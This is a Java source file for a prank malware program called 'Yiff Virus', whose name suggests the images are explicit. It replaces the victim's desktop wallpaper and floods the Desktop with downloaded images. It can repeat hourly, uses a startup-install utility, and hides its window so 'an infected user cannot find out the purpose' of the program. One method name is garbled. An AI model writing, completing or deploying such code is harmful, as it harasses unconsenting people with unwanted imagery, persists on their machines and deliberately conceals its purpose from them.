package me.bannock.virus;


import com.formdev.flatlaf.FlatDarculaLaf;
import com.google.gson.Gson;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.images.impl.TestImageProviderService;
import me.bannock.virus.utils.StartOnWindowsStartUtil;
import me.bannock.virus.utils.WindowsUtils;

import javax.swing.JFrame;
import java.awt.HeadlessException;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;

public class YiffVirus extends JFrame implements Runnable {

    static{
        FlatDarculaLaf.setup();
    }

    private Config config = new Config();
    private ImageProviderService imageProviderService = new TestImageProviderService();

    public static final YiffVirus INSTANCE = new YiffVirus();

    protected static final File HEADLESS_CONFIG_FILE = new File(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR, "msg.json");

    /**
     * Creates a new gui window
     * @throws HeadlessException Whenever it feels like it
     */
    public YiffVirus() throws HeadlessException {
        setSize(450, 450);
        setResizable(false);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setTitle("Yiff Virus");
        setContentPane(new VirusSetupForm(config, this).getForm());
    }

    /**
     * Entry point for application
     * @param args
     */
    public static void main(String[] args) {

        // Show the gui if the user wants a gui, autoload if the user configured it to autoload
        boolean showGui = true;
        for (String arg : args){
            switch(arg.toLowerCase()){
                case "-headless":{
                    showGui = false;
                    if (HEADLESS_CONFIG_FILE.exists()) {
                        try {
                            INSTANCE.setConfig(new Gson().fromJson(Files.readString(HEADLESS_CONFIG_FILE.toPath()), Config.class));
                        } catch (Exception ignored) {}
                    }
                    INSTANCE.run();
                }break;
            }
        }

        // If the jar is loaded from the virus install dir then do not show the gui, this is done so an infected user cannot
        // find out the purpose of the jar just by double-clicking it and reading the window title
        if (new File("").getAbsolutePath().equals(StartOnWindowsStartUtil.VIRUS_INSTALL_DIR.getAbsolutePath()))
            showGui = false;

        // Display gui if wanted by user
        if (showGui)
            INSTANCE.setVisible(true);

    }

    /**
     * Starts running the virus, locks thread
     */
    @Override
    public void run() {
        // If the window is still visible then hide and dispose it
        if (INSTANCE.isVisible()) {
            INSTANCE.setVisible(false);
            INSTANCE.dispose();
        }

        // Set image provider from config
        this.imageProviderService = config.getImageProvidmurr();

        // Dirs used by multiple options
        final File userHomeDir = new File(System.getProperty("user.home"));
        final File userDesktopDir = new File(userHomeDir, "/Desktop");

        // Set background
        if (config.shouldChangeBackground()){
            File bg = new File(StartOnWindowsStartUtil.WINDOWS_APPDATA_ROAMING,
                    "/" + Long.toString(System.currentTimeMillis(), Character.MAX_RADIX) + ".png");
            try {
                Files.write(bg.toPath(),
                        imageProviderService.fetchBytes(getImageProviderService().fetchImages(1).get(0)));
                WindowsUtils.changeBackground(bg.getAbsolutePath());
            } catch (IOException ignored) {}
        }

        // Image flood
        if (config.shouldImageFlood()){
            List<String> images = getImageProviderService().fetchImages(config.getImageAmount());
            for (String url : images){
                try {
                    File imageFile = new File(userDesktopDir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
                            "." + url.split("\\.")[url.split("\\.").length - 1]);
                    if (config.shouldScatterAcrossDrive()){
                        // TODO: Scatter across drive if enabled in the config
                    }
                    System.out.println(imageFile.getAbsolutePath());

                    // Write the image to the file
                    Files.write(imageFile.toPath(), getImageProviderService().fetchBytes(url));
                } catch (Exception ignored) {
                    ignored.printStackTrace();
                }

            }
        }

        // TODO: Set default user icon
        // C:\ProgramData\Microsoft\User Account Pictures

        // Repeated hourly if wanted
        if (config.shouldRunHourly())
            try{
                Thread.sleep(1000 * 60 * 60);
                run();
            }catch (Exception ignored){}
    }

    public void setConfig(Config config) {
        this.config = config;
    }

    public ImageProviderService getImageProviderService() {
        return imageProviderService;
    }
}
